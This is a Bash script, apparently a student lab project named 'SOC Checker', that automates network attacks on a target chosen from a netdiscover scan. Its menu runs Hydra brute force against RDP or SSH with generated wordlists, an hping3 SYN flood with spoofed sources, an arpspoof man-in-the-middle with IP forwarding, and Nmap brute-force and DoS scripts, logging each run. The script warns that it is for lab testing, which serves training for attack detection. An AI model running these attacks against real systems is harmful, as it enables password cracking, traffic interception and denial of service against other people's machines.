#!/bin/bash

# This script is created to automate different types of attack

#1. function to check and create audit log in /var/log
function LOGCREATION 
{
		  if [ -f /var/log/attackaudit.log ]                  #if attackaudit.log (seleted attack audit log) exist
		  then
			currentuser=$(whoami) 							  #to get current user
			sudo chown $currentuser /var/log/attackaudit.log  #to provide current user who is not a root user to write in /var/log/attackaudit.log
			
		  else
			currentuser=$(whoami) 						 	  #to get current user
			sudo touch /var/log/attackaudit.log               #to create custom log file in /var/log
			sudo chown $currentuser /var/log/attackaudit.log  #to permit currentuser to write in the custom audit log file
		 fi	
}

#2. function to get the IP range within subnet and select an IP address within the IP range netweork
function GETIPRANGE
	{
		#IPRange=$(ip route |grep "/"|awk '{print($1)}')
		echo -n "[?] Input IP Network Range and Subnet [24/16/8/4] (sample format-192.168.6.0/24):  "
		read IPRange
		sudo netdiscover -r $IPRange -PN > net_output.lst 
		echo -e "\n"
	}
	
#3. function to display and choose different type of attacks
function ATTACKTYPE
	{
		echo "[*] These are the different type of attacks "
		echo "[*] A - Bruteforce attack to ssh or rdp using hydra command "
		echo "[*] B - DOS Denial of Service attack on icmp mode using Hping3 "
		echo "[*] C - Man in the Middle attack using Arpspoof "
		echo "[*] D - NMAP tool - Bruteforce and DOS attack "
		echo -n "[*] Please input the type of attack to run [A|B|C|D]: "
		read AttackOption
		echo -e "\n"
			case $AttackOption in
			A|a)
				BRUTEFORCE 				#function to bruteforce using Hydra tool 
			;;
			B|b)
				HPING3_ATTACK           #function DOS Attack using Hping3 tool
			;;
			C|c) 
				MITM_ARPSPOOF           #function Man in the Middle using arpspoof tool
			;;
			D|d)
				NMAP_ATTACK             #function NMAP as tool for bruteforce and DoS attack 
			;;
			#E|e) #work-in-progress
			#	LLMNR_ATTACK  
			#;;
			*)                          #if input not within the list provided
				echo "Invalid Choice...try again"
				ATTACKTYPE              #function to display and choose different type of attacks
			;;	
			esac
}


#4. function to stop the running command without using CTRL-C (cancel)
function STOP_CMD
{
	
	if [[ $AttackOption == C || $AttackOption == c ]]
	then
	    #use for 2 commands running in parallel for Arpspoof 
	    echo "$PID1 $PID1a - $PID2 $PID2a"                                  
        echo "Press any key to stop attack..."
		read -n 1                              #Returns after reading the specified number of characters while honoring the delimiter to terminate early
		if [[ $PID1 == $PID1a  &&  $PID2 == $PID2a ]]
		then
		    echo "$PID1 $PID1a - $PID2 $PID2a"
			sudo kill -9 $PID1 $PID2 & wait &>/dev/null      #kill the the job most recently placed into the background
		    echo "running command cancelled.."
		else
		     wait 2&>/dev/null
		     echo "running command cancelled..."
		fi      		                   
    else  
        #use for single running command except Arpspoof    
        echo "Press any key to stop attack..." 
		read -n 1                              #Returns after reading the specified number of characters while honoring the delimiter to terminate early. 
		if [ $PID1 == $PID1a ]
		then	
			sudo kill -9 $PID1 & wait &>/dev/null #kill the the job most recently placed into the background and hide the terminate output message    		
		    
		    echo "running command cancelled.."
		else
		     &>/dev/null
		     echo "running command cancelled..."
		fi           
	fi
}

#5. function to execute exit script message
function EXITMESSAGE 
{
	currentpath=$(pwd)
	ExitMessage1=$(echo "[*] You have exited the script.")
	ExitMessage2=$(echo "[*] THANK YOU! Have an AWESOME day!")
	echo -e "\n"
	echo -e "[*] Attack Audit Log is located in /var/log/attackaudit.log \n"
	echo "[?] Do you want to open the audit log? [Y/N]: "
	read answer
		if [[ $answer == Y || $answer == y ]]
		then 
			cat /var/log/attackaudit.log
		fi
			echo "$ExitMessage1"
			echo "$ExitMessage2"
	CREDITS
	rm $currentpath/net_output.lst 
    rm $currentpath/passwordlist.lst 
    echo "The followimg files deleted: net_output.lst and passwordlist.lst "
 }
 
 #6. Research References
 function CREDITS
{
	echo -e "\n"
	echo "[#]****************************************************************************************************"
	echo "[#] REFERENCES & CREDITS TO:" 
	echo "[#] Attack Tools Information - https://www.kali.org/tools/ "                                                                                           
	echo "[#] ATTACKTYPE function - (SOC Analyst and Network Research Notes CFC311022 Modules)- https://www.notion.so/cfcapac/"                                
	echo "[#] LOGCREATION function - https://stackoverflow.com/questions/42953754/shell-script-checking-if-file-exists-creating-one-export-terminal-as-log"      
	echo "[#] GETIPRANGE function (netdiscover command) - https://www.kali.org/tools/netdiscover/"                                                               
	echo "[#] OPEN_NEW_WINDOW function (xterm command) - https://www.computerhope.com/unix/uxterm.htm"                                                           
    echo "[#] OPEN_NEW_WINDOW function - https://askubuntu.com/questions/46627/how-can-i-make-a-script-that-opens-terminal-windows-and-executes-commands-in-the "
	echo "[#] Aout Xterm - https://installati.one/ubuntu/21.04/xterm/"
	echo "[#] Xterm command - https://unix.stackexchange.com/questions/373377/start-xterm-with-different-shell-and-execute-commands"                             
	echo "[#] STOP_CMD function (read -n 1) - https://superuser.com/questions/1334929/quit-loop-if-a-key-is-pressed"                                             	
    echo "[#] STOP_CMD function (kill -9) - https://www.zdnet.com/article/how-to-kill-a-process-in-linux/"                                                       
    echo "[#] https://stackoverflow.com/questions/20861295/bash-hide-killed"                                                                                     
    echo "[#] Hydra tool - https://www.kali.org/tools/hydra/ "                                                                                                   
    echo "[#] HPING3 tool - https://linux.die.net/man/8/hping3 "
	echo "[#] MITM_ARPSPOOF function -  https://gist.github.com/saghul/806966 "
	echo "[#] MITM_ARPSPOOF function (sudo bash -c) - https://askubuntu.com/questions/783017/bash-proc-sys-net-ipv4-ip-forward-permission-denied"
	echo "[#] (>/dev/null 2>&1 & PID=$!) https://stackoverflow.com/questions/19964016/what-does-1-dev-null-21-pid1-mean"
	echo "[#] (>/dev/null 2>&1) - https://stackoverflow.com/questions/9390124/whats-difference-between-21-dev-null-and-21-dev-null"
	echo "[#] NMAP_ATTACK function - https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/"
	echo "[#] Nmap Script Reference: https://nmap.org/nsedoc/scripts/http-brute.html"
	echo "[#] Nmap Script Reference: https://nmap.org/nsedoc/scripts/ftp-brute.html"
	echo "[#]*****************************************************************************************************"
}

 
#**************** DIFFERENT ATTACK FUNCTIONS ******************
#A. function to bruteforce using Hydra tool 
function BRUTEFORCE 
	{
		echo "[*] You have selected Bruteforce attack - Hydra tool"
		echo "[*] Hydra is an open source,a brute-forcing tool that helps penetration testers and ethical hackers crack the passwords of network services"
		echo "[*] This attack will create a password list using crunch tool."
		echo "[*] The default administrator username will be used to bruteforce to rdp and "
		echo "[*] default root username will be used to bruteforce to ssh"
		echo -e "[*] Hydra command will be used as trial-and-error to crack password or login credentials \n"
			
		#to display the list of IP address found within the discovered IP range
		echo "[*] Here are the available IP address from $IPRange"
		cat net_output.lst | awk '{print($1)}'  		       
		echo -n "[?]Input Target IP address from above list "
		read TargetIPAdd
		echo "[*] Creating passwordlist.lst"
		crunch 4 4 1ac@ -o passwordlist.lst #simple password list creation for this Hydra attack test
		OSIP=$(sudo nmap -O -sV $TargetIPAdd |grep "Service Info:"|tr [:punct:] " "|awk '{print ($4)}')
		echo -e "[*] The $IPAddress OS is $OSIP"
		echo -e "[*] Starting bruteforce attack..."
		if [[ $OSIP == "Windows" ]]
		then
		#hydra rdp service on Windows OS using administrator username
			xterm -geometry 93x31+800+50 -hold -e hydra -l administrator -P passwordlist.lst $TargetIPAdd rdp -vV & PID1=$!
			#to open a new window and to display output of hydra command	
			PID1a=$PID1      # to get value of PID1 for later comparison in STOP_CMD function
			STOP_CMD         #function to stop the running command without using CTRL-C (cancel)
		else                       
		#hydra ssh service on Linux and Unix OS using root username
			xterm -geometry 93x31+800+50 -hold -e hydra -l root -P passwordlist.lst $TargetIPAdd ssh -vV & PID1=$!
			#to open a new window and to display output of hydra command
			PID1a=$PID1       # to get value of PID1 for later comparison in STOP_CMD function
			STOP_CMD          #function to stop the running command without using CTRL-C (cancel)
		fi
		#saving attack selection into log file
		Auditlog=$(echo "`date`- Bruteforce using Hydra on $TargetIPAdd") 
		echo "[#] $Auditlog" >> /var/log/attackaudit.log
		echo -n "Select another attack? [Y/N] "
		read answer
		if [[ $answer == Y || $answer == y ]] 
		then
		    #check if user wants to run another IP Range discovery
			echo -n "[?] Do you want to run another IP Range and Subnet? [Y/N]: "
			read answer
			if [[ $answer == Y || $answer == y ]]
			then
			GETIPRANGE #function to get the IP range within subnet and select an IP address within the IP range netweork
			ATTACKTYPE #function to display and choose different type of attacks
			fi
		ATTACKTYPE     #function to display and choose different type of attacks
		else
		EXITMESSAGE    #function to execute exit script message
		fi
	}

#B. function DOS Attack using Hping3 tool
function HPING3_ATTACK
 {
		echo "[*] You have selected Denial of Service (DOS) attack - Hping3 tool"
		echo "[*] Hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping program does with ICMP replies. "
		echo "[*] It is one of the de facto tools for security auditing and testing of firewalls and networks,"
		echo "[*] and was used to exploit the idle scan scanning technique "
		echo "[*] The command will send SYN packet with data size of 120 packets continously and in randon source IP "
		echo "[*] Here are the available IP address from $IPRange"
		cat net_output.lst | awk '{print($1)}'  #to display the list of IP address found within the IP range keyed in
		echo -n "[?]Input Target IP address from above list "
		read TargetIPAdd
		read -p "Press any key to resume ..."
		sudo hping3 -S -d 120 --flood --rand-source $TargetIPAdd & PID1=$! 
		PID1a=$PID1
		#Hping attack command -S a SYN flood is sending an insane amount of requests to a server in order to use up all it’s resources.
		#to ping target using the following -flags [-S to send SYN packet] [-d to set packet size of 120] 
		#[--flood sent packets as fast as possible, without taking care to show incoming replies.] [--rand-source hides IP address]
		STOP_CMD #to stop attack after command runs
		Auditlog=$(echo "`date`- DOS using Hping3 tool on $TargetIPAdd")
		echo "[#] $Auditlog" >> /var/log/attackaudit.log
		echo -n "Select another attack? [Y/N] "
		read answer
		if [[ $answer == Y || $answer == y ]]
		then
			echo -n "[?] Do you want to run another IP Range and Subnet? [Y/N]: "
			read answer
			if [[ $answer == Y || $answer == y ]]
			then
			GETIPRANGE   #function to get the IP range within subnet and select an IP address within the IP range netweork
			ATTACKTYPE   #function to display and choose different type of attacks
			fi
		ATTACKTYPE     #function to display and choose different type of attacks
		else
		EXITMESSAGE    #function to execute exit script message
		fi
 }
 
#C. function Man in the Middle using arpspoof tool
function MITM_ARPSPOOF 
 {
		echo "[*] You have selected Man in the Middle (MITM) attack - ARPspoof tool"
		echo "[*] ARPspoof to refer to an attack where a hacker impersonates the MAC address of another device on a local network.  "
		echo -e "[*] That results in the linking of an attacker's MAC address with the IP address of a legitimate computer or server on the network. \n"
		echo "[*] Here are the available IP address from $IPRange"
		cat net_output.lst | awk '{print($1)}'  
		echo -n "[?]Input Target IP address from above list "
		read TargetIPAdd
		echo -e "\n"
		netstat $TargetIPAdd -r |tail -n +2|awk '{print $2}' #to display gateway IP list
		echo -n "[?] Input Gateway or Router IP from above list "
		read RouterIPAdd
		echo -e "\n"
		sudo arp -d $TargetIPAdd #to delete the target IP in ARP Table
		sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward" #"sudo bash -c" is to be able to write into the file owned by root 
		#to enable IP Forwarding
		sudo xterm -geometry 93x31+200+50 -e sudo arpspoof -t $TargetIPAdd $RouterIPAdd & PID1=$! #command stored in a variable to tell the victim you are the router
		sudo xterm -geometry 93x31+800+50 -e sudo arpspoof -t $RouterIPAdd $TargetIPAdd & PID2=$! #command stored in a variable to tell the router you are the victim
		# & symbol use to run both commands in parallel 
		PID1a=$PID1
		PID2a=$PID2
		STOP_CMD 			#function to stop the running command without using CTRL-C (cancel)
		sudo bash -c "echo 0 > /proc/sys/net/ipv4/ip_forward" #to disable IP Forwarding
		Auditlog=$(echo "`date`- MITM using ARPspoof tool on $TargetIPAdd")
		echo "[#] $Auditlog" >> /var/log/attackaudit.log
		echo -n "Select another attack? [Y/N] "
		read answer
		if [[ $answer == Y || $answer == y ]]
		then
			echo -n "[?] Do you want to run another IP Range and Subnet? [Y/N]: "
			read answer
			if [[ $answer == Y || $answer == y ]]
			then
			GETIPRANGE  #function to get the IP range within subnet and select an IP address within the IP range network
			ATTACKTYPE   #function to display and choose different type of attacks
			fi
		ATTACKTYPE     #function to display and choose different type of attacks
		else
		EXITMESSAGE    #function to execute exit script message
		fi
 }
 #D. function NMAP as tool for bruteforce and DoS attack 
 function NMAP_ATTACK
 {
		echo "[*] You have selected NMAP Attack tool"
		echo "[*] NMAP is a network mapper tool scans and checks vulnerabilities and network mapping"
		echo "[*] It also can be used as attack tool as it comes equipped with a ton of scripts you can use from DoSing targets to exploiting them"
		echo -e "[*] In this session, you will have an option to choose some NMAP attack features \n "
		echo "[!] NMAP ATTACK OPTIONS"
		echo "[!] 1 - Brute for HTTP port 80 "
		echo "[!] 2 - Brute for HTTP port 80 "
		echo "[!] 3 - Denial of Service for to test target vulnerability to DoS "
		echo -n "[?] Input type of NMAP attack [1|2|3]: "
		read nmap_option
		cat net_output.lst | awk '{print($1)}'  
		echo -n "[?]Input Target IP address from above list "
		read TargetIPAdd
		echo -e "\n"
		case $nmap_option in
			1)
			    nmap_option="HTTP- BRuteforce"
			    echo "Nmap script will performs brute force password auditing against http basic, digest and ntlm authentication on port 80"
			    read -p "Press any key to resume ..." 
			  	sudo nmap --script http-brute -p 80 $TargetIPAdd
			;;
			2)
			    nmap_option="FTP- BRuteforce"
			    echo "Nmap script will performs brute force password auditing against FTP serverson on port 21 "
			    sudo nmap --script ftp-brute -p 21 $TargetIPAdd
			;;
			3)
			    nmap_option="DOS"
			    echo "This Nmp script to test if target Is Vulnerable to Dos"
			    sudo nmap --script dos -Pn -sV $TargetIPAdd & PID1=$! 
			    PID1a=$PID1
			    STOP_CMD #function to stop the running command without using CTRL-C (cancel)
			;;
			*)
				echo "Invalid Choice...try again"
				NMAP_ATTACK
			;;
			esac
		Auditlog=$(echo "`date`- NMAP tool $nmap_option attack on $TargetIPAdd")
		echo "[#] $Auditlog" >> /var/log/attackaudit.log
		echo -n "Select another attack? [Y/N] "
		read answer
		if [[ $answer == Y || $answer == y ]]
		then
			echo -n "[?] Do you want to run another IP Range and Subnet? [Y/N]: "
			read answer
			if [[ $answer == Y || $answer == y ]]
			then
			GETIPRANGE   #function to get the IP range within subnet and select an IP address within the IP range netweork
			ATTACKTYPE   #function to display and choose different type of attacks
			fi
		ATTACKTYPE     #function to display and choose different type of attacks
		else
		EXITMESSAGE    #function to execute exit script message
		
		fi
 }
 
#E. function NMAP as tool for bruteforce and DoS attack 
#~ function METASPLOIT_ATTACK
#~ {
#~ }

# ****************************** Start of the Script *******************************************
#Introduction message of the script
echo "[*] Thank you for using this script authored by Mary Ann Lim Tian"
echo "[!] Warning: This script is only intended for testing within a lab environment "
echo "[*] This script is about running an attack test for Project SOC Checker"
echo "[*] It will allow you to input IP Range to display the list of IP addresses as target and select type of attack to execute. "
echo "[*] Before starting the please ensure following tools are installed"
echo "[!] Xterm, Netdiscover, Hydra, NMAP, Crunch, John the ripper, Arpspoof,Hping3"
echo "[*] You also need to open Wireshark to view the attack as it runs."
echo -e "\n"

# Main Script

	LOGCREATION  #function to check and create audit log in /var/log
	GETIPRANGE  #function to get the IP range within subnet and select an IP address within the IP range netweork
	ATTACKTYPE   #function to display and choose different type of attacks
   

